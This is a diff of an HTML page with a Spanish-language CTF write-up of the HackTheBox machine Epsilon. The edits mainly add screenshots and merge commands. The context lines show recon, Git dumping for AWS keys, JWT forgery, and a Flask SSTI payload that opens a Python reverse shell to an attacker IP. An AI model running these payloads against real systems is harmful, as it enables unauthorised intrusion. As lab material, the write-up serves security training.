@@ -24,8 +24,6 @@
 80/tcp   open   http
 5000/tcp open   upnp</code></pre>
 
-<p>Interpretación: hay un servidor SSH para acceso remoto, un sitio web público en el puerto 80 y otra aplicación HTTP en el puerto 5000.</p>
-
 <p>Luego, realizamos un escaneo más detallado de los puertos abiertos para identificar versiones y servicios:</p>
 
 <pre><code>sudo nmap -p22,80,5000 -sCV -n -vvv 10.10.11.134 -oN infoPorts</code></pre>
@@ -43,8 +41,6 @@
 <p>Visitando <code>http://10.10.11.134</code> obtenemos un 403. Se comprueba si el repositorio Git está expuesto en <code>/.git</code> usando <code>gitdumper</code>:</p>
 
 <pre><code>./gitdumper.sh http://10.10.11.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo</code></pre>
-
-<p>Esto permite obtener la historia de commits, archivos y credenciales filtradas.</p>
 
 <h4>Revisión de commits antiguos</h4>
 <p>Los archivos actuales no revelan credenciales, por lo que revisamos commits anteriores:</p>
@@ -72,13 +68,10 @@ cat ../commits_diff.txt</code></pre>
 # aws_access_key_id y aws_secret_access_key
 # región: us-east-1</code></pre>
 
-<p>Listamos funciones Lambda:</p>
+<p>Listamos funciones Lambda y descargamos el código:</p>
 
-<pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions</code></pre>
-
-<p>Descargamos el código de la función:</p>
-
-<pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
+<pre><code>aws --endpoint-url=http://cloud.epsilon.htb/ lambda list-functions
+aws --endpoint-url=http://cloud.epsilon.htb/ lambda get-function --function-name costume_shop_v1
 wget http://cloud.epsilon.htb/path/to/code.zip
 unzip code.zip
 cat lambda_function.py</code></pre>
@@ -97,20 +90,25 @@ print(token)</code></pre>
 
 <pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.11.134/home</code></pre>
 
-<p>La misma cookie funciona para <code>http://epsilon.htb:5000/home</code>.</p>
+<p>La misma cookie funciona para <code>http://epsilon.htb:5000/home</code>:</p>
+<img src="writeups/img/epsilon/img3.png" alt="Home inside the platform">
+<p>El bypass se confirma visualmente:</p>
+<img src="writeups/img/epsilon/img4.png" alt="Authenticated home view">
 
 <h4>SSTI en Flask</h4>
 <p>En <code>/order</code>, los campos son evaluados con <code>render_template_string</code>, permitiendo SSTI. Probamos:</p>
 
 <pre><code>{{ 3*3 }}</code></pre>
 
-<p>Se obtiene <strong>9</strong>, confirmando la vulnerabilidad.</p>
+<p>Se obtiene <strong>9</strong>, confirmando la vulnerabilidad:</p>
+<img src="writeups/img/epsilon/img5.png" alt="SSTI test">
 
 <p>Para un reverse shell:</p>
 
 <pre><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.14.36\',6969));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\'/bin/bash\')"').read() }}</code></pre>
 
-<p>Se obtiene shell y el primer flag (<code>user.txt</code>).</p>
+<p>Se obtiene shell y el primer flag (<code>user.txt</code>):</p>
+<img src="writeups/img/epsilon/img6.png" alt="First flag obtained">
 
 <h3>5. Escalada de privilegios</h3>
 <p>Usando <code>pspy</code>, encontramos un cronjob que ejecuta <code>tar -h</code> cada 5 segundos:</p>
